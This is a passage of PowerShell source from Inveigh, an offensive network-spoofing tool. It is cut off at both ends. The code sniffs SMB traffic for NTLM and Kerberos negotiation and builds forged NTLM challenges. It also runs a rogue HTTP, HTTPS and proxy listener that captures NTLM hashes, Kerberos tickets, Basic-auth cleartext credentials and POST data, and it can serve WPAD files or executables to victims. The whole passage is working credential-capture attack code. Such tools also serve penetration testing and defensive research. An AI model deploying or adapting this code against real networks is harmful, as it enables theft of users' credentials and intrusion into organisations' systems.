$null\n        }\n        elseif(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 8),2) -eq \"72\" -and $SourceIP -eq $SnifferIP)\n        {\n            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB($SourcePort) outgoing negotiation request detected to $session_outgoing\") > $null\n        }\n\n        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0)\n        {\n            $inveigh.SMB_session_table.Add($Session,\"\")\n        }\n\n        $SMB_index = $payload_converted.IndexOf(\"FE534D42\")\n\n        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 24),4) -eq \"0000\" -and $SourceIP -ne $SnifferIP)\n        {\n            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB($SMBPort) negotiation request detected from $session\") > $null\n        }\n        elseif(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0 -and $payload_converted.SubString(($SMB_index + 24),4) -eq \"0000\" -and $SourceIP -eq $SnifferIP)\n        {\n            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB($SourcePort) outgoing negotiation request detected to $session_outgoing\") > $null\n        }\n\n        if(!$inveigh.SMB_session_table.ContainsKey($Session) -and $SMB_index -gt 0)\n        {\n            $inveigh.SMB_session_table.Add($Session,\"\")\n        }\n\n        $SMB_index = $payload_converted.IndexOf(\"2A864886F7120102020100\")\n\n        if($SMB_index -gt 0 -and $SourceIP -ne $SnifferIP)\n        {\n            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB($SMBPort) authentication method is Kerberos for $session\") > $null\n\n            if($Kerberos -eq 'Y')\n            {\n                $kerberos_length = Get-UInt16DataLength 0 $Payload[82..83]\n                $kerberos_length -= $SMB_index / 2\n                $kerberos_data = $Payload[($SMB_index/2)..($SMB_index/2 + $Payload.Count)]\n            }\n\n        }\n        elseif($SMB_index -gt 0 -and $SourceIP -eq $SnifferIP)\n        {\n            $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] SMB($SourcePort) outgoing authentication method is Kerberos to $session_outgoing\") > $null\n\n            if($Kerberos -eq 'Y')\n            {\n                $kerberos_length = Get-UInt16DataLength 0 $Payload[82..83]\n                $kerberos_length -= $SMB_index / 2\n                $kerberos_data = $Payload[($SMB_index/2)..($SMB_index/2 + $Payload.Count)]\n            }\n\n        }\n\n        return $kerberos_length,$kerberos_data\n    }\n\n    function Get-SMBNTLMChallenge\n    {\n        param ([Byte[]]$Payload)\n\n        $payload_converted = [System.BitConverter]::ToString($Payload)\n        $payload_converted = $payload_converted -replace \"-\",\"\"\n        $NTLM_index = $payload_converted.IndexOf(\"4E544C4D53535000\")\n\n        if($NTLM_index -gt 0)\n        {\n\n            if($payload_converted.SubString(($NTLM_index + 16),8) -eq \"02000000\")\n            {\n                $NTLM_challenge = $payload_converted.SubString(($NTLM_index + 48),16)\n            }\n\n            $target_name_length = Get-UInt16DataLength (($NTLM_index + 24) / 2) $Payload\n            $negotiate_flags = [System.Convert]::ToInt16(($payload_converted.SubString(($NTLM_index + 44),2)),16)\n            $negotiate_flags = [Convert]::ToString($negotiate_flags,2)\n            $target_info_flag = $negotiate_flags.SubString(0,1)\n\n            if($target_info_flag -eq 1)\n            {\n                $target_info_index = ($NTLM_index + 80) / 2\n                $target_info_index = $target_info_index + $target_name_length + 16\n                $target_info_item_type = $Payload[$target_info_index]\n                $i = 0\n\n                while($target_info_item_type -ne 0 -and $i -lt 10)\n                {\n                    $target_info_item_length = Get-UInt16DataLength ($target_info_index + 2) $Payload\n\n                    switch($target_info_item_type) \n                    {\n\n                        2\n                        {\n                            $netBIOS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload\n                        }\n\n                        3\n                        {\n                            $DNS_computer_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload\n                        }\n\n                        4\n                        {\n                            $DNS_domain_name = Convert-DataToString ($target_info_index + 4) $target_info_item_length $Payload\n                        }\n\n                    }\n\n                    $target_info_index = $target_info_index + $target_info_item_length + 4\n                    $target_info_item_type = $Payload[$target_info_index]\n                    $i++\n                }\n\n                if($netBIOS_domain_name -and $DNS_domain_name -and !$inveigh.domain_mapping_table.$netBIOS_domain_name -and $netBIOS_domain_name -ne $DNS_domain_name)\n                {\n                    $inveigh.domain_mapping_table.Add($netBIOS_domain_name,$DNS_domain_name)\n                    $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] Domain mapping added for $netBIOS_domain_name to $DNS_domain_name\") > $null\n                }\n\n                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)\n                {\n\n                    if($inveigh.enumerate[$i].IP -eq $target -and !$inveigh.enumerate[$i].Hostname)\n                    {\n                        $inveigh.enumerate[$i].Hostname = $DNS_computer_name\n                        $inveigh.enumerate[$i].\"DNS Domain\" = $DNS_domain_name\n                        $inveigh.enumerate[$i].\"netBIOS Domain\" = $netBIOS_domain_name\n                        break\n                    }\n\n                }\n\n            }\n\n        }\n\n        return $NTLM_challenge\n    }\n\n}\n\n# HTTP Server ScriptBlock - HTTP/HTTPS/Proxy listener\n$HTTP_scriptblock =\n{\n    param ($Challenge,$Kerberos,$KerberosCount,$KerberosCredential,$KerberosHash,$KerberosHostHeader,$HTTPAuth,\n    $HTTPBasicRealm,$HTTPContentType,$HTTPIP,$HTTPPort,$HTTPDefaultEXE,$HTTPDefaultFile,$HTTPDirectory,$HTTPResponse,\n    $HTTPS_listener,$IP,$NBNSBruteForcePause,$output_directory,$Proxy,$ProxyIgnore,$proxy_listener,$WPADAuth,\n    $WPADAuthIgnore,$WPADResponse)\n\n    function Get-NTLMChallengeBase64\n    {\n        param ([String]$Challenge,[Bool]$NTLMESS,[String]$ClientIPAddress,[Int]$ClientPort)\n\n        $HTTP_timestamp = Get-Date\n        $HTTP_timestamp = $HTTP_timestamp.ToFileTime()\n        $HTTP_timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($HTTP_timestamp))\n        $HTTP_timestamp = $HTTP_timestamp.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n\n        if($Challenge)\n        {\n            $HTTP_challenge = $Challenge\n            $HTTP_challenge_bytes = $HTTP_challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')\n            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n        }\n        else\n        {\n            $HTTP_challenge_bytes = [String](1..8 | ForEach-Object {\"{0:X2}\" -f (Get-Random -Minimum 1 -Maximum 255)})\n            $HTTP_challenge = $HTTP_challenge_bytes -replace ' ', ''\n            $HTTP_challenge_bytes = $HTTP_challenge_bytes.Split(\" \") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n        }\n\n        if($NTLMESS)\n        {\n            $HTTP_NTLM_negotiation_flags = 0x05,0x82,0x89,0x0a\n        }\n        else\n        {\n            $HTTP_NTLM_negotiation_flags = 0x05,0x82,0x81,0x0a\n        }\n\n        if(!$inveigh.HTTP_session_table.ContainsKey(\"$ClientIPAddress`:$ClientPort\"))\n        {\n            $inveigh.HTTP_session_table.Add(\"$ClientIPAddress`:$ClientPort\",$HTTP_challenge)\n        }\n        else\n        {\n            $inveigh.HTTP_session_table[\"$ClientIPAddress`:$ClientPort\"] = $HTTP_challenge\n        }\n\n        $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLM challenge $HTTP_challenge sent to $HTTP_source_IP`:$HTTP_source_port\") > $null\n        $hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.computer_name)\n        $netBIOS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.netBIOS_domain)\n        $DNS_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.DNS_domain)\n        $DNS_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($inveigh.DNS_computer_name)\n        $hostname_length = [System.BitConverter]::GetBytes($hostname_bytes.Length)[0,1]\n        $netBIOS_domain_length = [System.BitConverter]::GetBytes($netBIOS_domain_bytes.Length)[0,1]\n        $DNS_domain_length = [System.BitConverter]::GetBytes($DNS_domain_bytes.Length)[0,1]\n        $DNS_hostname_length = [System.BitConverter]::GetBytes($DNS_hostname_bytes.Length)[0,1]\n        $target_length = [System.BitConverter]::GetBytes($hostname_bytes.Length + $netBIOS_domain_bytes.Length + $DNS_domain_bytes.Length + $DNS_domain_bytes.Length + $DNS_hostname_bytes.Length + 36)[0,1]\n        $target_offset = [System.BitConverter]::GetBytes($netBIOS_domain_bytes.Length + 56)\n\n        $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +\n                            $netBIOS_domain_length +\n                            $netBIOS_domain_length +\n                            0x38,0x00,0x00,0x00 +\n                            $HTTP_NTLM_negotiation_flags +\n                            $HTTP_challenge_bytes +\n                            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +\n                            $target_length +\n                            $target_length + \n                            $target_offset +\n                            0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f +\n                            $netBIOS_domain_bytes +\n                            0x02,0x00 +\n                            $netBIOS_domain_length +\n                            $netBIOS_domain_bytes +\n                            0x01,0x00 +\n                            $hostname_length +\n                            $hostname_bytes +\n                            0x04,0x00 +\n                            $DNS_domain_length +\n                            $DNS_domain_bytes +\n                            0x03,0x00 +\n                            $DNS_hostname_length +\n                            $DNS_hostname_bytes +\n                            0x05,0x00 +\n                            $DNS_domain_length +\n                            $DNS_domain_bytes +\n                            0x07,0x00,0x08,0x00 +\n                            $HTTP_timestamp +\n                            0x00,0x00,0x00,0x00,0x0a,0x0a\n\n        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)\n        $NTLM = \"NTLM \" + $NTLM_challenge_base64\n        \n        return $NTLM\n    }\n\n    if($HTTPS_listener)\n    {\n        $HTTP_type = \"HTTPS\"\n    }\n    elseif($proxy_listener)\n    {\n        $HTTP_type = \"Proxy\"\n    }\n    else\n    {\n        $HTTP_type = \"HTTP\"\n    }\n\n    if($HTTPIP -ne '0.0.0.0')\n    {\n        $HTTPIP = [System.Net.IPAddress]::Parse($HTTPIP)\n        $HTTP_endpoint = New-Object System.Net.IPEndPoint($HTTPIP,$HTTPPort)\n    }\n    else\n    {\n        $HTTP_endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,$HTTPPort)\n    }\n\n    $HTTP_running = $true\n    $HTTP_listener = New-Object System.Net.Sockets.TcpListener $HTTP_endpoint\n   \n    if($proxy_listener)\n    {\n        $HTTP_linger = New-Object System.Net.Sockets.LingerOption($true,0)\n        $HTTP_listener.Server.LingerState = $HTTP_linger\n    }\n    \n    try\n    {\n        $HTTP_listener.Start()\n    }\n    catch\n    {\n        $inveigh.output_queue.Add(\"[-] [$(Get-Date -format s)] Error starting $HTTP_type listener\") > $null\n        $error_message = $_.Exception.Message\n        $error_message = $error_message -replace \"`n\",\"\"\n        $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())\") > $null\n        $HTTP_running = $false\n    }\n\n    if($Kerberos -eq 'Y')\n    {\n\n        if($KerberosHash)\n        {\n            $kerberos_base_key = (&{for ($i = 0;$i -lt $KerberosHash.Length;$i += 2){$KerberosHash.SubString($i,2)}}) -join \"-\"\n            $kerberos_base_key = $kerberos_base_key.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n        }\n        elseif($KerberosCredential)\n        {\n            $kerberos_base_key = Get-KerberosAES256BaseKey ($KerberosCredential.UserName).Trim(\"\\\") $KerberosCredential.Password\n        }\n\n    }\n    \n    :HTTP_listener_loop while($inveigh.running -and $HTTP_running)\n    {\n        $TCP_request = $null\n        $TCP_request_bytes = New-Object System.Byte[] 8192\n        $HTTP_send = $true\n        $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes(\"Content-Type: text/html\")\n        $HTTP_header_cache_control = $null\n        $HTTP_header_authenticate = $null\n        $HTTP_header_authenticate_data = $null\n        $HTTP_message = ''\n        $HTTP_header_authorization = ''\n        $HTTP_header_host = $null\n        $HTTP_header_user_agent = $null\n        $HTTP_request_raw_URL = $null\n        $NTLM = \"NTLM\"\n\n        if(!$HTTP_client.Connected -and $inveigh.running)\n        {\n            $HTTP_client_close = $false\n            $HTTP_async = $HTTP_listener.BeginAcceptTcpClient($null,$null)\n\n            do\n            {\n\n                if(!$inveigh.running)\n                {\n                    break HTTP_listener_loop\n                }\n                \n                Start-Sleep -m 10\n            }\n            until($HTTP_async.IsCompleted)\n\n            $HTTP_client = $HTTP_listener.EndAcceptTcpClient($HTTP_async)\n            $HTTP_client_handle_old = $HTTP_client.Client.Handle\n            \n            if($HTTPS_listener)\n            {\n                $HTTP_clear_stream = $HTTP_client.GetStream()\n                $HTTP_stream = New-Object System.Net.Security.SslStream($HTTP_clear_stream,$false)\n                $SSL_cert = (Get-ChildItem Cert:\\LocalMachine\\My | Where-Object {$_.Subject -match $inveigh.certificate_CN})\n                $HTTP_stream.AuthenticateAsServer($SSL_cert,$false,[System.Security.Authentication.SslProtocols]::Default,$false)\n            }\n            else\n            {\n                $HTTP_stream = $HTTP_client.GetStream()\n            }\n            \n        }\n\n        if($HTTPS_listener)\n        {\n            [Byte[]]$SSL_request_bytes = $null\n\n            while($HTTP_clear_stream.DataAvailable)\n            {\n                $HTTP_request_byte_count = $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length)\n                $SSL_request_bytes += $TCP_request_bytes[0..($HTTP_request_byte_count - 1)]\n            }\n\n            $TCP_request = [System.BitConverter]::ToString($SSL_request_bytes)\n        }\n        else\n        {\n\n            while($HTTP_stream.DataAvailable)\n            {\n                $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length) > $null\n            }\n\n            $TCP_request = [System.BitConverter]::ToString($TCP_request_bytes)\n        }\n        \n        if($TCP_request -like \"47-45-54-20*\" -or $TCP_request -like \"48-45-41-44-20*\" -or $TCP_request -like \"4f-50-54-49-4f-4e-53-20*\" -or $TCP_request -like \"43-4f-4e-4e-45-43-54*\" -or $TCP_request -like \"50-4f-53-54*\")\n        {\n            $HTTP_raw_URL = $TCP_request.Substring($TCP_request.IndexOf(\"-20-\") + 4,$TCP_request.Substring($TCP_request.IndexOf(\"-20-\") + 1).IndexOf(\"-20-\") - 3)\n            $HTTP_raw_URL = $HTTP_raw_URL.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n            $HTTP_request_raw_URL = New-Object System.String ($HTTP_raw_URL,0,$HTTP_raw_URL.Length)\n            $HTTP_source_IP = $HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString\n            $HTTP_source_Port = $HTTP_client.Client.RemoteEndpoint.Port\n            $HTTP_connection_header_close = $true\n\n            if(($TCP_request).StartsWith(\"47-45-54-20\"))\n            {\n                $HTTP_method = \"GET\"\n            }\n            elseif(($TCP_request).StartsWith(\"48-45-41-44-20\"))\n            {\n                $HTTP_method = \"HEAD\"\n            }\n            elseif(($TCP_request).StartsWith(\"4f-50-54-49-4F-4E-53-20\"))\n            {\n                $HTTP_method = \"OPTIONS\"\n            }\n            elseif(($TCP_request).StartsWith(\"43-4F-4E-4E-45-43-54\"))\n            {\n                $HTTP_method = \"CONNECT\"\n            }\n            elseif(($TCP_request).StartsWith(\"50-4F-53-54-20\"))\n            {\n                $HTTP_method = \"POST\"\n            }\n            \n            if($NBNSBruteForcePause)\n            {\n                $inveigh.NBNS_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()\n                $inveigh.hostname_spoof = $true\n            }\n\n            if($TCP_request -like \"*-48-6F-73-74-3A-20-*\")\n            {\n                $HTTP_header_host_extract = $TCP_request.Substring($TCP_request.IndexOf(\"-48-6F-73-74-3A-20-\") + 19)\n                $HTTP_header_host_extract = $HTTP_header_host_extract.Substring(0,$HTTP_header_host_extract.IndexOf(\"-0D-0A-\"))\n                $HTTP_header_host_extract = $HTTP_header_host_extract.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                $HTTP_header_host = New-Object System.String ($HTTP_header_host_extract,0,$HTTP_header_host_extract.Length)\n            }\n\n            if($TCP_request -like \"*-55-73-65-72-2D-41-67-65-6E-74-3A-20-*\")\n            {\n                $HTTP_header_user_agent_extract = $TCP_request.Substring($TCP_request.IndexOf(\"-55-73-65-72-2D-41-67-65-6E-74-3A-20-\") + 37)\n                $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Substring(0,$HTTP_header_user_agent_extract.IndexOf(\"-0D-0A-\"))\n                $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                $HTTP_header_user_agent = New-Object System.String ($HTTP_header_user_agent_extract,0,$HTTP_header_user_agent_extract.Length)\n            }\n\n            if($HTTP_request_raw_URL_old -ne $HTTP_request_raw_URL -or $HTTP_client_handle_old -ne $HTTP_client.Client.Handle)\n            {\n                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $HTTP_method request for $HTTP_request_raw_URL received from $HTTP_source_IP`:$HTTP_source_port\") > $null\n                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) host header $HTTP_header_host received from $HTTP_source_IP`:$HTTP_source_port\") > $null\n\n                if($HTTP_header_user_agent)\n                {\n                    $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) user agent received from $HTTP_source_IP`:$HTTP_source_port`:`n$HTTP_header_user_agent\") > $null\n                }\n\n                if($Proxy -eq 'Y' -and $ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_}))\n                {\n                    $inveigh.output_queue.Add(\"[*] [$(Get-Date -format s)] $HTTP_type($HTTPPort) ignoring wpad.dat request due to user agent match from $HTTP_source_IP`:$HTTP_source_port\") > $null\n                }\n\n            }\n\n            if($TCP_request -like \"*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*\")\n            {\n                $HTTP_header_authorization_extract = $TCP_request.Substring($TCP_request.IndexOf(\"-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-\") + 46)\n                $HTTP_header_authorization_extract = $HTTP_header_authorization_extract.Substring(0,$HTTP_header_authorization_extract.IndexOf(\"-0D-0A-\"))\n                $HTTP_header_authorization_extract = $HTTP_header_authorization_extract.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                $HTTP_header_authorization = New-Object System.String ($HTTP_header_authorization_extract,0,$HTTP_header_authorization_extract.Length)\n            }\n\n            if(($HTTP_request_raw_URL -notmatch '/wpad.dat' -and $HTTPAuth -eq 'Anonymous') -or ($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous') -or (\n            $HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -like 'NTLM*' -and $WPADAuthIgnore.Count -gt 0 -and ($WPADAuthIgnore | Where-Object {$HTTP_header_user_agent -match $_})))\n            {\n                $HTTP_response_status_code = 0x32,0x30,0x30\n                $HTTP_response_phrase = 0x4f,0x4b\n                $HTTP_client_close = $true\n            }\n            else\n            {\n\n                if(($HTTP_request_raw_url -match '/wpad.dat' -and $WPADAuth -eq 'NTLM') -or ($HTTP_request_raw_url -notmatch '/wpad.dat' -and $HTTPAuth -eq 'NTLM'))\n                {\n                    $HTTPNTLMESS = $true\n                }\n                else\n                {\n                    $HTTPNTLMESS = $false\n                }\n\n                if($proxy_listener)\n                {\n                    $HTTP_response_status_code = 0x34,0x30,0x37\n                    $HTTP_header_authenticate = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20\n                }\n                else\n                {\n                    $HTTP_response_status_code = 0x34,0x30,0x31\n                    $HTTP_header_authenticate = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20\n                }\n\n                $HTTP_response_phrase = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64\n            }\n            \n            if($TCP_request -like \"50-4f-53-54*\")\n            {\n                $HTTP_POST_request_extract = $TCP_request.Substring($TCP_request.IndexOf(\"-0D-0A-0D-0A-\") + 12)\n                $HTTP_POST_request_extract = $HTTP_POST_request_extract.Substring(0,$HTTP_POST_request_extract.IndexOf(\"-00-\"))\n                $HTTP_POST_request_extract = $HTTP_POST_request_extract.Split(\"-\") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}\n                $HTTP_POST_request = New-Object System.String ($HTTP_POST_request_extract,0,$HTTP_POST_request_extract.Length)\n\n                if($HTTP_POST_request_old -ne $HTTP_POST_request)\n                {\n                    $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) POST request $HTTP_POST_request captured from $HTTP_source_IP`:$HTTP_source_port\") > $null\n                    $inveigh.POST_request_file_queue.Add($HTTP_POST_request) > $null\n                    $inveigh.POST_request_list.Add($HTTP_POST_request) > $null\n                }\n\n                $HTTP_POST_request_old = $HTTP_POST_request\n            }\n            \n            if($HTTP_header_authorization.StartsWith('NTLM '))\n            {\n                $HTTP_header_authorization = $HTTP_header_authorization -replace 'NTLM ',''\n                [Byte[]]$HTTP_request_bytes = [System.Convert]::FromBase64String($HTTP_header_authorization)\n                $HTTP_connection_header_close = $false\n\n                if([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '01-00-00-00')\n                {\n                    $NTLM = Get-NTLMChallengeBase64 $Challenge $HTTPNTLMESS $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port\n                }\n                elseif([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '03-00-00-00')\n                {\n                    Get-NTLMResponse $HTTP_request_bytes \"Y\" $HTTP_source_IP $HTTP_source_port $HTTPPort $HTTP_type\n                    $HTTP_response_status_code = 0x32,0x30,0x30\n                    $HTTP_response_phrase = 0x4f,0x4b\n                    $HTTP_client_close = $true\n                    $NTLM_challenge = $null\n\n                    if($proxy_listener)\n                    {\n                        \n                        if($HTTPResponse -or $HTTPDirectory)\n                        {\n                            $HTTP_header_cache_control = 0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x6e,0x6f,0x2d,0x63,0x61,0x63,0x68,0x65,0x2c,0x20,0x6e,0x6f,0x2d,0x73,0x74,0x6f,0x72,0x65\n                        }\n                        else\n                        {\n                            $HTTP_send = $false\n                        }\n\n                    }\n\n                }\n                else\n                {\n                    $HTTP_client_close = $true\n                }\n\n            }\n            elseif($HTTP_header_authorization.StartsWith('Negotiate '))\n            {\n                $HTTP_response_status_code = 0x32,0x30,0x30\n                $HTTP_response_phrase = 0x4f,0x4b\n                $HTTP_client_close = $true\n                $HTTP_header_authorization = $HTTP_header_authorization -replace 'Negotiate ',''\n                [Byte[]]$HTTP_request_bytes = [System.Convert]::FromBase64String($HTTP_header_authorization)\n                $HTTP_request_converted = [System.BitConverter]::ToString($HTTP_request_bytes)\n                $HTTP_request_converted = $HTTP_request_converted -replace \"-\",\"\"\n                $HTTP_index = $HTTP_request_converted.IndexOf(\"2A864886F7120102020100\")\n\n                if($HTTP_index -gt 0)\n                {\n                    $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) authentication method is Kerberos for $HTTP_source_IP`:$HTTP_source_port\") > $null\n\n                    if($Kerberos -eq 'Y')\n                    {\n                        $HTTP_connection_header_close = $false\n                        New-KerberosKirbi $HTTP_request_bytes $kerberos_base_key $HTTP_type $HTTPPort \"$HTTP_source_IP`:$HTTP_source_port\"\n                    }\n\n                }\n                \n            }\n            elseif($HTTP_header_authorization.Startswith('Basic '))\n            {\n                $HTTP_response_status_code = 0x32,0x30,0x30\n                $HTTP_response_phrase = 0x4f,0x4b\n                $HTTP_header_authorization = $HTTP_header_authorization -replace 'Basic ',''\n                $cleartext_credentials = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($HTTP_header_authorization))\n                $HTTP_client_close = $true\n                $inveigh.cleartext_file_queue.Add($cleartext_credentials) > $null\n                $inveigh.cleartext_list.Add($cleartext_credentials) > $null\n                $inveigh.output_queue.Add(\"[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) Basic authentication cleartext credentials captured from $HTTP_source_IP`:$HTTP_source_port`:\") > $null\n                $inveigh.output_queue.Add($cleartext_credentials) > $null\n\n                if($inveigh.file_output)\n                {\n                    $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $HTTP_type($HTTPPort) Basic authentication cleartext credentials written to \" + \"Inveigh-Cleartext.txt\") > $null\n                }\n                 \n            }\n\n            if(($HTTP_request_raw_url -notmatch '/wpad.dat' -and $HTTPAuth -eq 'Anonymous') -or ($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous') -or (\n            $WPADAuthIgnore.Count -gt 0 -and $WPADAuth -like 'NTLM*' -and ($WPADAuthIgnore | Where-Object {$HTTP_header_user_agent -match $_})) -or $HTTP_client_close)\n            {\n\n                if($HTTPDirectory -and $HTTPDefaultEXE -and $HTTP_request_raw_url -like '*.exe' -and (Test-Path (Join-Path $HTTPDirectory $HTTPDefaultEXE)) -and !(Test-Path (Join-Path $HTTPDirectory $HTTP_request_raw_url)))\n                {\n                    [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory $HTTPDefaultEXE))\n                    $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes(\"Content-Type: application/exe\")\n                }\n                elseif($HTTPDirectory)\n                {\n\n                    if($HTTPDefaultFile -and !(Test-Path (Join-Path $HTTPDirectory $HTTP_request_raw_url)) -and (Test-Path (Join-Path $HTTPDirectory $HTTPDefaultFile)) -and $HTTP_request_raw_url -notmatch '/wpad.dat')\n                    {\n                        [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory $HTTPDefaultFile))\n                    }\n                    elseif(($HTTPDefaultFile -and $HTTP_request_raw_url -eq '' -or $HTTPDefaultFile -and $HTTP_request_raw_url -eq '/') -and (Test-Path (Join-Path $HTTPDirectory $HTTPDefaultFile)))\n                    {\n                        [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory $HTTPDefaultFile))\n                    }\n                    elseif($WPADResponse -and $HTTP_request_raw_url -match '/wpad.dat')\n                    {\n                        [Byte[]]$HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($WPADResponse)\n                        $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes(\"Content-Type: application/x-ns-proxy-autoconfig\")\n                    }\n                    else\n                    {\n\n                        if(Test-Path (Join-Path $HTTPDirectory $HTTP_request_raw_url))\n                        {\n                            [Byte[]]$HTTP_message_bytes = [System.IO.File]::ReadAllBytes((Join-Path $HTTPDirectory $HTTP_request_raw_url))\n                        }\n                        else\n                        {\n                            [Byte[]]$HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTPResponse)\n                        }\n            \n                    }\n\n                }\n                else\n                {\n                \n                    if($WPADResponse -and $HTTP_request_raw_url -match '/wpad.dat' -and (!$ProxyIgnore -or !($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_})))\n                    {\n                        $HTTP_message = $WPADResponse\n                        $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes(\"Content-Type: application/x-ns-proxy-autoconfig\")\n                    }\n                    elseif($HTTPResponse)\n                    {\n                        $HTTP_message = $HTTPResponse\n                        \n                        if($HTTPContentType)\n                        {\n                            $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes(\"Content-Type: $HTTPContentType\")\n                        }\n\n                    }\n\n                    [Byte[]]$HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)\n                }\n\n            }\n            else\n            {\n                [Byte[]]$HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)\n            }\n\n            $HTTP_timestamp = Get-Date -format r\n            $HTTP_timestamp = [System.Text.Encoding]::UTF8.GetBytes($HTTP_timestamp)\n\n            if(($HTTPAuth -like 'NTLM*' -and $HTTP_request_raw_URL -notmatch '/wpad.dat') -or ($WPADAuth -like 'NTLM*' -and $HTTP_request_raw_URL -match '/wpad.dat') -and !$HTTP_client_close)\n            {\n\n                if($Kerberos -eq 'Y' -and ($KerberosHostHeader.Count -gt 0 -and $KerberosHostHeader -contains $HTTP_header_host))\n                {\n                    $HTTP_header_authenticate_data = [System.Text.Encoding]::UTF8.GetBytes(\"Negotiate\")\n                }\n                else\n                {\n                    $HTTP_header_authenticate_data = [System.Text.Encoding]::UTF8.GetBytes($NTLM)\n                }\n                \n            }\n            elseif(($HTTPAuth -eq 'Basic' -and $HTTP_request_raw_URL -notmatch '/wpad.dat') -or ($WPADAuth -eq 'Basic' -and $HTTP_request_raw_URL -match '/wpad.dat'))\n            {\n                $HTTP_header_authenticate_data = [System.Text.Encoding]::UTF8.GetBytes(\"Basic realm=$HTTPBasicRealm\")\n            }\n            \n            